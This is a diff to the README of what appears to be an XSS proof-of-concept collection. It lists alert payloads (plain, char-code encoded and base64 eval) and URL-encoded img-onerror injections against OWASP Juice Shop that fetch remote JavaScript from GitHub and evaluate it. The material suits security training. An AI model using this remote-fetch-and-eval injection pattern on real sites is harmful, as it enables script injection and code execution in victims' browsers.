@@ -15,7 +15,13 @@
             * if required, deal with Content Security Policy (CSP; not covered here)
     * list may be updated with additional different variants
 
-## `simpleStd.js` - round brackets; quote; space; backslash
+## `simpleStd.js`
+
+* uses:
+    * round brackets
+    * quote
+    * space
+    * backslash
 
 ```
 alert('DOMAIN: '.concat(document.domain).concat('\nORIGIN: ').concat(window.origin));
@@ -25,7 +31,11 @@ alert('DOMAIN: '.concat(document.domain).concat('\nORIGIN: ').concat(window.orig
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch('%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleStd.js').then(function(r)%7Breturn%20r.text().then(function(t)%7Breturn%20eval(t);%7D)%7D);%22%3E
 
-## `simpleDec.js` - round brackets
+## `simpleDec.js`
+
+* uses:
+    * round brackets
+
 ```
 alert(String.fromCharCode(68,79,77,65,73,78,58,32).concat(document.domain).concat(String.fromCharCode(10,79,82,73,71,73,78,58,32)).concat(window.origin));
 ```
@@ -34,7 +44,13 @@ alert(String.fromCharCode(68,79,77,65,73,78,58,32).concat(document.domain).conca
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch('%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleDec.js').then(function(r)%7Breturn%20r.text().then(function(t)%7Breturn%20eval(t);%7D)%7D);%22%3E
 
-## `simpleB64.js` - round brackets, quote, `eval()`
+## `simpleB64.js`
+
+* uses:
+    * round brackets
+    * quote
+    * `eval()`
+
 ```
 eval(atob('YWxlcnQoJ0RPTUFJTjogJy5jb25jYXQoZG9jdW1lbnQuZG9tYWluKS5jb25jYXQoJ1xuT1JJR0lOOiAnKS5jb25jYXQod2luZG93Lm9yaWdpbikpOwo='));
 ```
